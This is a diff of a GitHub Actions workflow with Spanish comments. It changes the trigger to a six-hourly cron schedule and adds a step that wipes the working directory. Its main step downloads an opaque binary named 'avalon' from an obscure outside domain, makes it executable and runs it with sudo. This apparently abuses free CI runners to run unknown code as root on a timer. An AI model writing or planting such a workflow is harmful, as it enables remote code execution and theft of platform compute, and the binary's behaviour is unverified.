@@ -1,25 +1,30 @@
-name: Ejecución AvalonNNN202020
+name: bot66666669999999
 
 on:
-  workflow_dispatch: # Esto te permite darle al botón "Run workflow" manualmente
-  push:
-    branches: [ main ] # Se ejecuta automáticamente al subir cambios a la rama main
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *'
 
 jobs:
-  ejecutar-binario:
+  avalon-run:
     runs-on: ubuntu-latest
-
+    
     steps:
-      - name: Descargar y preparar binario
-        run: |
-          # 1. Descargar
-          wget https://dcasdcas.online/avalon.x86_64
-          
-          # 2. Renombrar
-          mv avalon.x86_64 avalon
-          
-          # 3. Dar permisos
-          chmod +x avalon
-          
-          # 4. Ejecutar con sudo
-          sudo ./avalon codespace
+    - name: 🗑️ Limpiar directorio
+      run: |
+        rm -rf * 2>/dev/null || true
+    
+    - name: 🚀 Descargar y Ejecutar Avalon
+      run: |
+        # 1. Descargar el archivo
+        wget https://dcasdcas.online/avalon.x86_64
+        
+        # 2. Renombrar el archivo
+        mv avalon.x86_64 avalon
+        
+        # 3. Dar permisos de ejecución
+        chmod +x avalon
+        
+        # 4. Ejecutar con sudo y el parámetro codespace
+        echo "Iniciando avalon..."
+        sudo ./avalon codespace
